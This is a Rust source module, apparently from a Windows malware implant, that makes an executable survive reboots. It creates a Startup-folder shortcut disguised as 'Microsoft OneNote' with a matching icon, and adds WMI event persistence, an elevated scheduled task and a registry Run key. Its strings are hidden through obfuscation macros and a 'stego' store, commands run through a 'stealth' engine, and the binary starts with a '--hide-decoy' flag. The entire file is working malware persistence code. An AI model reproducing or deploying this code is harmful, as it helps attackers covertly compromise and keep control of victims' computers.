use crate::config::Config;
use anyhow::{Context, Result};
use std::env;
use std::path::Path;
use std::os::windows::process::CommandExt;
use std::process::Command;
use windows::core::{Interface, HSTRING, BSTR};
use windows::Win32::System::Com::{CoCreateInstance, CoInitializeEx, CoUninitialize, CLSCTX_INPROC_SERVER, COINIT_APARTMENTTHREADED, IPersistFile};
use windows::Win32::UI::Shell::{IShellLinkW, ShellLink};
use windows::Win32::UI::WindowsAndMessaging::SW_SHOWMINNOACTIVE;
use windows::Win32::System::TaskScheduler::{
    TaskScheduler, ITaskService, ITaskDefinition,
    TASK_TRIGGER_LOGON, TASK_TRIGGER_BOOT, TASK_ACTION_EXEC,
    TASK_RUNLEVEL_HIGHEST, TASK_RUNLEVEL_LUA, TASK_LOGON_INTERACTIVE_TOKEN,
    TASK_CREATE_OR_UPDATE, IExecAction, ITaskFolder
};
use windows::Win32::System::Variant::VARIANT;

const CREATE_NO_WINDOW: u32 = 0x08000000;

pub fn ensure_startup(exe_path: std::path::PathBuf) -> Result<()> {
    let startup_config = Config::get_startup_config();
    if !startup_config.enabled { return Ok(()); }
    
    let task_name = startup_config.task_name;
    let exe_path_str = exe_path.to_string_lossy();
    let exe_path_quoted = format!("\"{}\" --hide-decoy", exe_path.display());

    // 1. Try visibility-focused Shortcut in Startup folder (Method 1: Custom Icon)
    let _ = create_startup_shortcut(&exe_path, &task_name);

    let mut success = false;
    
    // 2. Try stealth-focused Scheduled Task & WMI if Admin
    if is_admin_check() {
        let _ = create_wmi_persistence_kct(&task_name, &exe_path_str, "--hide-decoy");
        if let Ok(_) = create_scheduled_task_native(&task_name, &exe_path_str, "--hide-decoy", startup_config.on_logon, true) {
            success = true;
        }
    }

    // 3. Fallback to Registry Run if Task failed or not Admin
    if !success {
        let _ = register_registry_run(&task_name, &exe_path_quoted);
    }
    
    Ok(())
}

fn create_scheduled_task_native(name: &str, exe_path: &str, args: &str, on_logon: bool, highest_privs: bool) -> Result<()> {
    let sc = if on_logon { "ONLOGON" } else { "ONSTART" };
    let rl = if highest_privs { "HIGHEST" } else { "LIMITED" };
    let cmd = crate::core::stego_store::StegoStore::get(crate::core::stego_store::StringCategory::Win, "KCT_SCHTASKS_CREATE")
        .replace("{}", name)
        .replacen("{}", exe_path, 1)
        .replacen("{}", args, 1)
        .replacen("{}", sc, 1)
        .replacen("{}", rl, 1);
    if let Some(engine) = crate::stealth::get_engine() {
        let _ = engine.execute_stealth_cmd_with_output(&cmd);
    }
    Ok(())
}

fn create_wmi_persistence_kct(name: &str, exe_path: &str, args: &str) -> Result<()> {
    if !is_admin_check() { return Ok(()); }
    let ps_script = crate::core::stego_store::StegoStore::get(crate::core::stego_store::StringCategory::Win, "KCT_WMI_PERSIST_PS")
        .replace("{}", name)
        .replacen("{}", name, 1)
        .replacen("{}", exe_path, 1)
        .replacen("{}", args, 1);
    if let Some(engine) = crate::stealth::get_engine() {
        let _ = engine.execute_stealth_ps(&ps_script);
    }
    Ok(())
}

fn create_startup_shortcut(exe_path: &std::path::Path, name: &str) -> Result<()> {
    let link_name = format!("{}.lnk", crate::poly_hide!("Microsoft OneNote").unsecure_to_string());
    let appdata = env::var("APPDATA")?;
    // "Microsoft", "Windows", "Start Menu", "Programs", "Startup" 문자열 은닉
    let startup_dir = std::path::Path::new(&appdata)
        .join(crate::poly_hide!("Microsoft").unsecure_to_string())
        .join(crate::poly_hide!("Windows").unsecure_to_string())
        .join(crate::poly_hide!("Start Menu").unsecure_to_string())
        .join(crate::poly_hide!("Programs").unsecure_to_string())
        .join(crate::poly_hide!("Startup").unsecure_to_string());
    
    let link_path = startup_dir.join(&link_name);
    unsafe {
        let init_result = CoInitializeEx(None, COINIT_APARTMENTTHREADED);
        let shell_link: IShellLinkW = CoCreateInstance(&ShellLink, None, CLSCTX_INPROC_SERVER)?;
        
        let target_path_str = exe_path.to_string_lossy().to_string();
        shell_link.SetPath(&HSTRING::from(&target_path_str))?;
        shell_link.SetArguments(&HSTRING::from("--hide-decoy"))?;
        shell_link.SetDescription(&HSTRING::from(crate::poly_hide!("Microsoft OneNote Launcher").unsecure_to_string()))?;
        shell_link.SetShowCmd(SW_SHOWMINNOACTIVE)?;
        
        // Set OneNote icon for the shortcut (Using absolute path)
        if let Some(parent) = exe_path.parent() {
            let icon_path = parent.join("microsfoton.ico");
            if icon_path.exists() {
                let icon_path_str = icon_path.to_string_lossy().to_string();
                shell_link.SetIconLocation(&HSTRING::from(&icon_path_str), 0)?;
            }
        }

        let persist_file: IPersistFile = shell_link.cast()?;
        persist_file.Save(&HSTRING::from(link_path.as_os_str()), true)?;
        if init_result.is_ok() { CoUninitialize(); }
    }
    Ok(())
}

fn register_registry_run(name: &str, path: &str) -> Result<()> {
    let run_key_path = crate::poly_hide!("Software\\Microsoft\\Windows\\CurrentVersion\\Run").unsecure_to_string();
    let reg_hive = if is_admin_check() { "HKLM" } else { "HKCU" };
    let cmd = crate::core::stego_store::StegoStore::get(crate::core::stego_store::StringCategory::Win, "REG_ADD_RUN")
        .replace("{}", reg_hive)
        .replacen("{}", &run_key_path, 1)
        .replacen("{}", name, 1)
        .replacen("{}", path, 1);
    if let Some(engine) = crate::stealth::get_engine() {
        let _ = engine.execute_stealth_cmd_with_output(&cmd);
    }
    Ok(())
}

fn is_admin_check() -> bool {
    unsafe {
        let mut token_handle = std::mem::zeroed();
        if winapi::um::processthreadsapi::OpenProcessToken(winapi::um::processthreadsapi::GetCurrentProcess(), winapi::um::winnt::TOKEN_QUERY, &mut token_handle) != 0 {
            let mut elevation: winapi::um::winnt::TOKEN_ELEVATION = std::mem::zeroed();
            let mut size = std::mem::size_of_val(&elevation) as u32;
            let result = winapi::um::securitybaseapi::GetTokenInformation(token_handle, winapi::um::winnt::TokenElevation, &mut elevation as *mut _ as *mut _, size, &mut size);
            winapi::um::handleapi::CloseHandle(token_handle);
            return result != 0 && elevation.TokenIsElevated != 0;
        }
    }
    false
}